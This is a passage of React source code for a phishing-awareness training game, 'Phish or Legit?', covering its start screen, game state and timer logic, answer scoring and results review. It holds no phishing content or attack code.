            <div style={{ fontSize: 13, color: "#fca5a5", lineHeight: 1.7 }}>
              {weakSpots.join(", ")}. Consider additional training on these attack categories.
            </div>
          </div>
        )}

        {/* Scenario Review */}
        <div
          style={{
            background: "#0f172a",
            border: "1px solid #1e293b",
            borderRadius: 16,
            padding: 24,
            marginBottom: 24,
          }}
        >
          <div style={{ fontSize: 13, fontWeight: 700, color: "#94a3b8", textTransform: "uppercase", letterSpacing: 1, marginBottom: 16 }}>
            Scenario Review
          </div>
          {results.map((r, i) => (
            <div
              key={i}
              style={{
                display: "flex",
                alignItems: "center",
                gap: 12,
                padding: "10px 0",
                borderBottom: i < results.length - 1 ? "1px solid #1e293b" : "none",
              }}
            >
              <span style={{ fontSize: 18, flexShrink: 0 }}>
                {r.isCorrectVerdict && r.isCorrectAction ? "✅" : r.isCorrectVerdict ? "⚠️" : "❌"}
              </span>
              <div style={{ flex: 1, minWidth: 0 }}>
                <div style={{ fontSize: 13, color: "#e2e8f0", fontWeight: 600, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                  {r.scenario.subject || r.scenario.body.slice(0, 60) + "..."}
                </div>
                <div style={{ fontSize: 11, color: "#64748b", marginTop: 2 }}>
                  {TYPE_META[r.scenario.type].icon} {r.scenario.category} • {r.timeSpent}s
                </div>
              </div>
              <span
                style={{
                  fontSize: 11,
                  padding: "3px 8px",
                  borderRadius: 6,
                  background: r.scenario.isPhish ? "#ef444422" : "#22c55e22",
                  color: r.scenario.isPhish ? "#ef4444" : "#22c55e",
                  fontWeight: 600,
                }}
              >
                {r.scenario.isPhish ? "PHISH" : "LEGIT"}
              </span>
            </div>
          ))}
        </div>

        {/* Actions */}
        <div style={{ display: "flex", gap: 12 }}>
          <button
            onClick={onRestart}
            style={{
              flex: 1,
              padding: "14px 24px",
              background: "linear-gradient(135deg, #4361ee, #7209b7)",
              color: "#fff",
              border: "none",
              borderRadius: 12,
              fontSize: 15,
              fontWeight: 700,
              cursor: "pointer",
              letterSpacing: 0.5,
            }}
          >
            Play Again
          </button>
        </div>
      </div>
    </div>
  );
}

// ─── MAIN APP ───────────────────────────────────────────────────────────────

export default function PhishOrLegit() {
  const [screen, setScreen] = useState("start"); // start | playing | result | metrics
  const [mode, setMode] = useState("standard"); // standard | advanced | all
  const [scenarios, setScenarios] = useState([]);
  const [currentIndex, setCurrentIndex] = useState(0);
  const [results, setResults] = useState([]);
  const [totalTime, setTotalTime] = useState(0);
  const [roundStartTime, setRoundStartTime] = useState(null);
  const [elapsedTime, setElapsedTime] = useState(0);
  const [userVerdict, setUserVerdict] = useState(null); // null | 'phish' | 'legit'
  const [userAction, setUserAction] = useState(null);
  const [showResult, setShowResult] = useState(false);
  const timerRef = useRef(null);

  const currentScenario = scenarios[currentIndex];

  // Timer
  useEffect(() => {
    if (screen === "playing" && !showResult) {
      const start = Date.now();
      setRoundStartTime(start);
      timerRef.current = setInterval(() => {
        setElapsedTime(Math.floor((Date.now() - start) / 1000));
      }, 1000);
      return () => clearInterval(timerRef.current);
    }
    return () => clearInterval(timerRef.current);
  }, [screen, currentIndex, showResult]);

  const startGame = (selectedMode) => {
    setMode(selectedMode);
    let pool;
    if (selectedMode === "standard") pool = SCENARIOS.filter((s) => s.mode === "standard");
    else if (selectedMode === "advanced") pool = SCENARIOS.filter((s) => s.mode === "advanced");
    else pool = [...SCENARIOS];

    // Shuffle
    const shuffled = pool.sort(() => Math.random() - 0.5);
    setScenarios(shuffled);
    setCurrentIndex(0);
    setResults([]);
    setTotalTime(0);
    setElapsedTime(0);
    setUserVerdict(null);
    setUserAction(null);
    setShowResult(false);
    setScreen("playing");
  };

  const submitAnswer = () => {
    if (!userVerdict || !userAction) return;
    clearInterval(timerRef.current);

    const timeSpent = elapsedTime;
    const isCorrectVerdict =
      (userVerdict === "phish" && currentScenario.isPhish) ||
      (userVerdict === "legit" && !currentScenario.isPhish);
    const isCorrectAction = CORRECT_ACTIONS[String(currentScenario.isPhish)].includes(userAction);

    setResults((prev) => [
      ...prev,
      {
        scenario: currentScenario,
        userVerdict,
        userAction,
        isCorrectVerdict,
        isCorrectAction,
        timeSpent,
      },
    ]);
    setTotalTime((prev) => prev + timeSpent);
    setShowResult(true);
  };

  const nextScenario = () => {
    if (currentIndex + 1 >= scenarios.length) {
      setScreen("metrics");
    } else {
      setCurrentIndex((i) => i + 1);
      setUserVerdict(null);
      setUserAction(null);
      setShowResult(false);
      setElapsedTime(0);
    }
  };

  // ── START SCREEN ──────────────────────────────────────────────────────────
  if (screen === "start") {
    return (
      <div
        style={{
          minHeight: "100vh",
          background: "#020617",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          padding: 20,
          fontFamily: "'DM Sans', system-ui, sans-serif",
        }}
      >
        <style>{`
          @import url('https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,500;0,9..40,700;0,9..40,800;1,9..40,400&family=JetBrains+Mono:wght@400;600&display=swap');
          @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
          @keyframes pulse { 0%, 100% { opacity: 0.4; } 50% { opacity: 0.8; } }
          @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-6px); } }
          * { box-sizing: border-box; margin: 0; padding: 0; }
          body { background: #020617; }
        `}</style>

        <div
          style={{
            maxWidth: 600,
            width: "100%",
            textAlign: "center",
            animation: "fadeIn 0.6s ease",
          }}
        >
          {/* Logo area */}
          <div
            style={{
              width: 100,
              height: 100,
              borderRadius: 24,
              background: "linear-gradient(135deg, #4361ee22, #7209b722)",
              border: "2px solid #4361ee44",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              margin: "0 auto 28px",
              fontSize: 48,
              animation: "float 3s ease-in-out infinite",
            }}
          >
            🎣
          </div>

          <h1
            style={{
              fontSize: 44,
              fontWeight: 800,
              background: "linear-gradient(135deg, #4361ee, #7209b7, #f72585)",
              WebkitBackgroundClip: "text",
              WebkitTextFillColor: "transparent",
              letterSpacing: -1.5,
              marginBottom: 8,
              lineHeight: 1.1,
            }}
          >
            Phish or Legit?
          </h1>
          <div
            style={{
              fontSize: 16,
              color: "#64748b",
              marginBottom: 8,
              fontWeight: 500,
            }}
          >
            Real-Time Inbox Simulator
          </div>
          <div
            style={{
              fontSize: 13,
              color: "#475569",
              marginBottom: 40,
              maxWidth: 400,
              margin: "0 auto 40px",
              lineHeight: 1.6,
            }}
          >
            Emails, Slack messages, SMS, calendar invites, and AI-generated exec requests.
            Can you spot the threats before they compromise your organization?
          </div>

          {/* Mode selection */}
          <div style={{ display: "flex", flexDirection: "column", gap: 12, maxWidth: 360, margin: "0 auto" }}>
            {[
              {
                id: "standard",
                label: "Standard Mode",
                desc: "7 scenarios — Emails, Slack, SMS, calendar invites",
                icon: "📬",
                count: SCENARIOS.filter((s) => s.mode === "standard").length,
              },
              {
                id: "advanced",
                label: "Advanced Mode",
                desc: "MFA fatigue, OAuth phishing, vendor fraud, deepfakes",
                icon: "⚡",
                count: SCENARIOS.filter((s) => s.mode === "advanced").length,
              },
              {
                id: "all",
                label: "Full Simulation",
                desc: "All scenarios — comprehensive assessment",
                icon: "🏆",
                count: SCENARIOS.length,
              },
            ].map((m) => (
              <button
                key={m.id}
                onClick={() => startGame(m.id)}
                style={{
                  padding: "18px 24px",
                  background: "#0f172a",
                  border: "1px solid #1e293b",
                  borderRadius: 14,
                  cursor: "pointer",
                  textAlign: "left",
                  display: "flex",
                  alignItems: "center",
                  gap: 16,
                  transition: "all 0.2s",
                }}
                onMouseOver={(e) => {
                  e.currentTarget.style.borderColor = "#4361ee66";
                  e.currentTarget.style.background = "#0f172aee";
                  e.currentTarget.style.transform = "translateY(-2px)";
                  e.currentTarget.style.boxShadow = "0 8px 30px rgba(67, 97, 238, 0.1)";
                }}
                onMouseOut={(e) => {
                  e.currentTarget.style.borderColor = "#1e293b";
                  e.currentTarget.style.background = "#0f172a";
                  e.currentTarget.style.transform = "translateY(0)";
                  e.currentTarget.style.boxShadow = "none";
                }}
              >
                <span style={{ fontSize: 28, flexShrink: 0 }}>{m.icon}</span>
                <div style={{ flex: 1 }}>
                  <div style={{ fontSize: 15, fontWeight: 700, color: "#e2e8f0", marginBottom: 2 }}>
                    {m.label}
                  </div>
                  <div style={{ fontSize: 12, color: "#64748b", lineHeight: 1.4 }}>{m.desc}</div>
                </div>
                <span
                  style={{
                    fontSize: 12,
                    fontWeight: 600,
                    color: "#4361ee",
                    background: "#4361ee22",
                    padding: "4px 10px",
                    borderRadius: 8,
                    fontFamily: "'JetBrains Mono', monospace",
                  }}
                >
                  {m.count}
                </span>
              </button>
            ))}
          </div>

          <div style={{ fontSize: 11, color: "#334155", marginTop: 24, lineHeight: 1.6 }}>
            ⏱ 10–15 minutes • Tracks accuracy, speed, and weak spots
          </div>
        </div>
      </div>
    );
  }

  // ── METRICS SCREEN ────────────────────────────────────────────────────────
  if (screen === "metrics") {
    return <MetricsDashboard results={results} totalTime={totalTime} onRestart={() => setScreen("start")} />;
  }

  // ── PLAYING SCREEN ────────────────────────────────────────────────────────
  return (
    <div
      style={{
        minHeight: "100vh",
        background: "#020617",
        fontFamily: "'DM Sans', system-ui, sans-serif",
        padding: "20px 20px 120px",
      }}
    >
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,500;0,9..40,700;0,9..40,800;1,9..40,400&family=JetBrains+Mono:wght@400;600&display=swap');
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes pulse { 0%, 100% { opacity: 0.4; } 50% { opacity: 0.8; } }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #020617; }
      `}</style>

      <div style={{ maxWidth: 640, margin: "0 auto" }}>
        {/* Top bar */}
        <div
          style={{
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            marginBottom: 20,
            flexWrap: "wrap",
            gap: 12,
          }}
        >
          <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
            <span style={{ fontSize: 22 }}>🎣</span>
            <span style={{ fontSize: 16, fontWeight: 800, color: "#f1f5f9", letterSpacing: -0.5 }}>
              Phish or Legit?
            </span>
          </div>
          <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
            <div style={{ display: "flex", alignItems: "center", gap: 6, color: "#64748b", fontSize: 13 }}>
              ⏱ <Timer seconds={elapsedTime} />
            </div>
          </div>
        </div>

        {/* Progress */}
        <div style={{ marginBottom: 24 }}>
          <ProgressBar current={currentIndex + 1} total={scenarios.length} />
        </div>

        {/* Message */}
        <div style={{ marginBottom: 24, animation: "fadeIn 0.4s ease" }}>
          <MessageCard scenario={currentScenario} />
        </div>

        {/* Verdict buttons */}
        <div style={{ marginBottom: 16 }}>
          <div
            style={{
              fontSize: 12,
              fontWeight: 700,
              color: "#64748b",
              textTransform: "uppercase",
              letterSpacing: 1.5,
              marginBottom: 10,
            }}
          >
            Step 1 — Is this phishing or legitimate?
          </div>
          <div style={{ display: "flex", gap: 10 }}>
            {[
              { id: "phish", label: "🚨 Phishing", color: "#ef4444" },
              { id: "legit", label: "✅ Legitimate", color: "#22c55e" },
            ].map((v) => (
              <button
                key={v.id}
                onClick={() => setUserVerdict(v.id)}
                style={{
                  flex: 1,
                  padding: "14px 20px",
                  background: userVerdict === v.id ? v.color + "22" : "#0f172a",
                  border: `2px solid ${userVerdict === v.id ? v.color : "#1e293b"}`,
                  borderRadius: 12,
                  color: userVerdict === v.id ? v.color : "#94a3b8",
                  fontSize: 15,
                  fontWeight: 700,
                  cursor: "pointer",
                  transition: "all 0.15s",
                }}
              >
                {v.label}
              </button>
            ))}
          </div>
        </div>

        {/* Action buttons */}
        <div style={{ marginBottom: 20 }}>
          <div
            style={{
              fontSize: 12,
              fontWeight: 700,
              color: "#64748b",
              textTransform: "uppercase",
              letterSpacing: 1.5,
              marginBottom: 10,
            }}
          >
            Step 2 — What action do you take?
          </div>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
            {ACTIONS.map((a) => (
              <button
                key={a.id}
                onClick={() => setUserAction(a.id)}
                style={{
                  padding: "12px 16px",
                  background: userAction === a.id ? a.color + "22" : "#0f172a",
                  border: `2px solid ${userAction === a.id ? a.color : "#1e293b"}`,
                  borderRadius: 10,
                  color: userAction === a.id ? a.color : "#94a3b8",
                  fontSize: 13,
                  fontWeight: 600,
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  gap: 8,
                  transition: "all 0.15s",
                }}
              >
                <span style={{ fontSize: 18 }}>{a.icon}</span>
                {a.label}
              </button>
            ))}
          </div>
        </div>

        {/* Submit */}
        <button
          onClick={submitAnswer}
          disabled={!userVerdict || !userAction}
          style={{
            width: "100%",
            padding: "16px 24px",
            background:
              userVerdict && userAction
                ? "linear-gradient(135deg, #4361ee, #7209b7)"
                : "#1e293b",
            color: userVerdict && userAction ? "#fff" : "#475569",
            border: "none",
            borderRadius: 12,
            fontSize: 16,
            fontWeight: 700,
            cursor: userVerdict && userAction ? "pointer" : "not-allowed",
            letterSpacing: 0.5,
            transition: "all 0.2s",
          }}
        >
          Submit Answer
        </button>
      </div>

      {/* Result overlay */}
      {showResult && (
        <ResultOverlay
          scenario={currentScenario}
          userVerdict={userVerdict}
          userAction={userAction}
          isCorrectVerdict={results[results.length - 1]?.isCorrectVerdict}
          isCorrectAction={results[results.length - 1]?.isCorrectAction}
          onContinue={nextScenario}
        />
      )}
    </div>
  );
}
